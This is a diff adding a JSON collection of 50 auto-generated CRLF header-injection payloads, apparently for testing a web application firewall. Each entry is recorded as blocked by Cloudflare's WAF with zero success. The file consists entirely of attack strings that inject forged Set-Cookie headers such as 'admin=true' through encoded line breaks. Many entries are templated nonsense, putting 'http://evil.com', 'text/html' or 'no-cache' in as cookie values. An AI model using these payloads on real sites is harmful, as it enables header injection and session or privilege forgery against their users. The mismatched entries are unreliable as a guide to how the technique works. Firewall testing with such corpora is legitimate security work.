@@ -1,0 +1,707 @@
+{
+  "category": "crlf_injection",
+  "subcategory": "comprehensive",
+  "count": 50,
+  "payloads": [
+    {
+      "id": "crlf_injection-10000",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0aSet-Cookie: admin=true",
+      "description": "CRLF %0d%0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10001",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0a%0d%0aSet-Cookie: admin=true",
+      "description": "CRLF double %0d%0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10002",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0aSet-Cookie: admin=true",
+      "description": "CRLF %0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10003",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0a%0aSet-Cookie: admin=true",
+      "description": "CRLF double %0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10004",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0dSet-Cookie: admin=true",
+      "description": "CRLF %0d Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10005",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0dSet-Cookie: admin=true",
+      "description": "CRLF double %0d Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10006",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\r\\nSet-Cookie: admin=true",
+      "description": "CRLF \\r\\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10007",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\r\\n\\r\\nSet-Cookie: admin=true",
+      "description": "CRLF double \\r\\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10008",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\nSet-Cookie: admin=true",
+      "description": "CRLF \\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10009",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\n\\nSet-Cookie: admin=true",
+      "description": "CRLF double \\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10010",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0aSet-Cookie: http://evil.com",
+      "description": "CRLF %0d%0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10011",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0a%0d%0aSet-Cookie: http://evil.com",
+      "description": "CRLF double %0d%0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10012",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0aSet-Cookie: http://evil.com",
+      "description": "CRLF %0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10013",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0a%0aSet-Cookie: http://evil.com",
+      "description": "CRLF double %0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10014",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0dSet-Cookie: http://evil.com",
+      "description": "CRLF %0d Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10015",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0dSet-Cookie: http://evil.com",
+      "description": "CRLF double %0d Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10016",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\r\\nSet-Cookie: http://evil.com",
+      "description": "CRLF \\r\\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10017",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\r\\n\\r\\nSet-Cookie: http://evil.com",
+      "description": "CRLF double \\r\\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10018",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\nSet-Cookie: http://evil.com",
+      "description": "CRLF \\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10019",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\n\\nSet-Cookie: http://evil.com",
+      "description": "CRLF double \\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10020",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0aSet-Cookie: text/html",
+      "description": "CRLF %0d%0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10021",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0a%0d%0aSet-Cookie: text/html",
+      "description": "CRLF double %0d%0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10022",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0aSet-Cookie: text/html",
+      "description": "CRLF %0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10023",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0a%0aSet-Cookie: text/html",
+      "description": "CRLF double %0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10024",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0dSet-Cookie: text/html",
+      "description": "CRLF %0d Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10025",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0dSet-Cookie: text/html",
+      "description": "CRLF double %0d Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10026",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\r\\nSet-Cookie: text/html",
+      "description": "CRLF \\r\\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10027",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\r\\n\\r\\nSet-Cookie: text/html",
+      "description": "CRLF double \\r\\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10028",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\nSet-Cookie: text/html",
+      "description": "CRLF \\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10029",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\n\\nSet-Cookie: text/html",
+      "description": "CRLF double \\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10030",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0aSet-Cookie: injected",
+      "description": "CRLF %0d%0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10031",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0a%0d%0aSet-Cookie: injected",
+      "description": "CRLF double %0d%0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10032",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0aSet-Cookie: injected",
+      "description": "CRLF %0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10033",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0a%0aSet-Cookie: injected",
+      "description": "CRLF double %0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10034",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0dSet-Cookie: injected",
+      "description": "CRLF %0d Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10035",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0dSet-Cookie: injected",
+      "description": "CRLF double %0d Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10036",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\r\\nSet-Cookie: injected",
+      "description": "CRLF \\r\\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10037",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\r\\n\\r\\nSet-Cookie: injected",
+      "description": "CRLF double \\r\\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10038",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\nSet-Cookie: injected",
+      "description": "CRLF \\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10039",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\n\\nSet-Cookie: injected",
+      "description": "CRLF double \\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10040",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0aSet-Cookie: no-cache",
+      "description": "CRLF %0d%0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10041",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0a%0d%0aSet-Cookie: no-cache",
+      "description": "CRLF double %0d%0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10042",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0aSet-Cookie: no-cache",
+      "description": "CRLF %0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10043",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0a%0aSet-Cookie: no-cache",
+      "description": "CRLF double %0a Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10044",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0dSet-Cookie: no-cache",
+      "description": "CRLF %0d Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10045",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "%0d%0dSet-Cookie: no-cache",
+      "description": "CRLF double %0d Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10046",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\r\\nSet-Cookie: no-cache",
+      "description": "CRLF \\r\\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10047",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\r\\n\\r\\nSet-Cookie: no-cache",
+      "description": "CRLF double \\r\\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10048",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\nSet-Cookie: no-cache",
+      "description": "CRLF \\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-10049",
+      "category": "crlf_injection",
+      "subcategory": "comprehensive",
+      "payload": "\\n\\nSet-Cookie: no-cache",
+      "description": "CRLF double \\n Set-Cookie",
+      "technique": "crlf_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
